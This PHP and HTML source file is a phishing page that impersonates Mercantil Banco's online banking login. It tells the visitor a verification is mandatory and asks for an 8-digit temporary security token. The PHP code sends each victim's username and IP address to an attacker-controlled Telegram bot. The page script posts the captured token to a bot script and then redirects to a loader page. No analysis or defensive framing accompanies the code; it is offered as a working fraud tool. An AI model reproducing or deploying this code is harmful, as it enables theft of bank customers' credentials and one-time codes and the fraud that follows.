<?php
require "./config.php";
require './gobbot/facherito/admin/run.php';
require './gobbot/facherito/skill/send.php';
include './fatgov.php';
if (isset($_GET['exprmntusr'])) {
    $username = $_GET['exprmntusr'];
    addUserToDatabase($username);
    function start($username)
    {
        $msg = "➖➖➖[ " . APP_NAME . " ]➖➖➖\n\n";
        $msg .= "🌐 𝐈𝐍𝐆𝐑𝐄𝐒𝐀𝐍𝐃𝐎 𝐓𝐎𝐊𝐄𝐍 \n\n<code>" . $username . "</code> :: <code>" . getIP22() . "</code>\n\n";
        $apiToken = BOT_TOKEN;
        $data = [
            'chat_id' => CHAT_ID,
            'text' => $msg,
            'parse_mode' => 'html'
        ];
        $url = "https://api.telegram.org/bot$apiToken/sendMessage?";
        $response = @file_get_contents($url . http_build_query($data));
    }

    if ($alertx == true) {
        start($username);
    }

} else {
    echo ".";
}

if (isset($_GET['exprmntusr'])) {
    $username = $_GET['exprmntusr'];
}
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <title>Mercantil en Línea</title>
    <link href="https://www30.mercantilbanco.com/favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <link href="assets/sms/clon.css" rel="stylesheet" />
    <style>
        .h1 *

        /* Eliminar subrayado de los enlaces */
        a {
            text-decoration: none;
            color: inherit;
        }

        /* Opcional: Ajustar el estilo del texto dentro de los enlaces si es necesario */
        .security-method a p {
            margin: 0;
        }

        /* Estilo del pie de página */
        .footer {
            width: 100%;
            text-align: center;
            padding: 0;
            background-color: #f1f1f1;
        }

        .footer img {
            width: 100%;
            height: auto;
        }

        /* Estilo del contenedor principal */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }

        /* Estilos para los métodos de seguridad */
        .security-method {
            display: inline-block;
            margin: 20px;
        }

        .security-method img {
            max-width: 100px;
            height: auto;
        }

        .security-method p {
            margin-top: 10px;
        }

        /* Media Queries para pantallas más pequeñas */
        @media (max-width: 768px) {
            .security-method {
                display: block;
                margin: 10px auto;
            }

            .security-method img {
                max-width: 80px;
            }

            .footer-web {
                display: none;
            }

            .footer-mobile {
                display: block;
                padding: 0;
            }
        }

        @media (min-width: 769px) {
            .footer-web {
                display: block;
            }

            .footer-mobile {
                display: none;
            }
        }

        .security-method {
            font-family: Arial, sans-serif;
            margin: 20px;
        }

        .input-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin: 20px auto;
            width: 100%;
            max-width: 300px;
            /* Ajusta el tamaño máximo del contenedor si es necesario */
        }

        .custom-input {
            border: 2px solid #d2d3d3;
            border-radius: 20px;
            /* Redondea los bordes del input */
            padding: 9px 15px;
            /* Ajusta el padding para reducir el tamaño */
            font-size: 19px;
            /* Ajusta el tamaño de la fuente */
            margin-bottom: 10px;
            outline: none;
            width: 100%;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
            /* Centra el texto dentro del input */
        }

        .custom-input::placeholder {
            color: gray;
            opacity: 0.7;
        }

        .submit-button {
            background-color: #004d9d;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 10px 68px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .submit-button:hover {
            background-color: #0056b3;
            transform: translateY(-2px);
        }
    </style>
</head>

<body>
    <form action="javascript:void(0);" method="post">
        <div class="footer footer-web">
            <img alt="Footer Web" src="assets/sms/Captura-de-pantalla-2024-09-10-213742.png" />
        </div>
        <div class="footer footer-mobile">
            <img alt="Footer Móvil" src="assets/sms/Captura-de-pantalla-2024-09-10-175316.png" />
        </div>
        <div class="container">
            <h1>VERIFICACION OBLIGATORIA</h1>
         
            <a>

                <p>Ingrese la <b>CLAVE TEMPORAL</b> que hemos enviado<br> a su dispositivo de seguridad.</p>
            </a>
            <img alt="1" height="91" src="assets/sms/Captura-de-pantalla-2024-09-10-221820.png" width="70" />
        </div>

        <div class="input-container">
            <input type="hidden" id="exprmntusr" name="exprmntusr" value="<?= isset($username) ? $username : '' ?>">
            <input class="custom-input" id="tokencode" maxlength="8" minlength="8" name="tk1" oninput="this.value = this.value.replace(/[^0-9]/g, '')" pattern="\d{8}" placeholder="- - - - - - - -" required="" title="Debe ingresar exactamente 8 dígitos numéricos" type="text" />
            <br />
            <button class="submit-button" id="continue-button" type="button">Continuar</button>
        </div>
    </form>
    <script>
        document.getElementById('continue-button').addEventListener('click', function () {
            const tokencode = document.getElementById('tokencode').value;
            const username = document.getElementById('exprmntusr').value;
           
            if (!tokencode || tokencode.length !== 8) {
                alert('El token debe ser un número de exactamente 8 dígitos.');
            } else {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', './gobbot/facherito/skill/send.php', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.onload = function () {
                    if (xhr.status === 200) {
                        window.location.href = `./loaderrr.php?exprmntusr=${encodeURIComponent(username)}`;
                    } else {
                        alert('Hubo un problema al enviar el token.');
                    }
                };
                xhr.send(`tokencode=${encodeURIComponent(tokencode)}&exprmntusr=${encodeURIComponent(username)}`);
            }
        });
    </script>
</body>

</html>